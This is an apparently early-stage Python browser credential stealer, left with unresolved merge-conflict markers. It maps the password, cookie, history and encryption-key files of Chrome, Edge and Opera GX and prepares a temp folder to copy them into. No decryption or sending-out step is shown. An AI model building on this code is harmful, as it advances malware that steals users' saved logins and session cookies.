<<<<<<< HEAD
import os


def main():
    BasePath = os.getenv('localappdata')

    TARGET_FILE_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Local State',
        "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\Login Data',
        "CHROME_COOKIES_DB_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\Cookies',
        "CHROME_HISTORY_DB_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\History',
        "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Google\\Chrome\\User Data\\Default\\Bookmarks',
        "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Local State',
        "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\Login Data',
        "EDGE_COOKIES_DB_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\Cookies',
        "EDGE_HISTORY_DB_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\History',
        "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Microsoft\\Edge\\User Data\\Default\\Bookmark',
        "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                       '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Local State',
        "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data',
        "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Cookies',
        "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\History',
        "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Bookmark'
    }

    COPY_PATH = {
        "CHROME_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Local_State',
        "CHROME_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Login_Data',
        "CHROME_COOKIES_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Cookies',
        "CHROME_HISTORY_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_History',
        "CHROME_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Chrome_Bookmarks',
        "EDGE_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Edge_Local_State',
        "EDGE_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_Login_Data',
        "EDGE_COOKIES_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_Cookies',
        "EDGE_HISTORY_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_History',
        "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\Default\\Edge_Bookmark',
        "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                       '\\Temp\\Copy\\OPERAGX_Local_State',
        "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Login_Data',
        "OPERAGX_COOKIES_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Cookies',
        "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_History',
        "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Bookmark',
    }

    if not os.path.exists(BasePath + "/Temp/Copy/"):
            os.makedirs(BasePath + "/Temp/Copy/")




if __name__ == "__main__":
    main()
=======
import sqlite3
import os
>>>>>>> origin/main
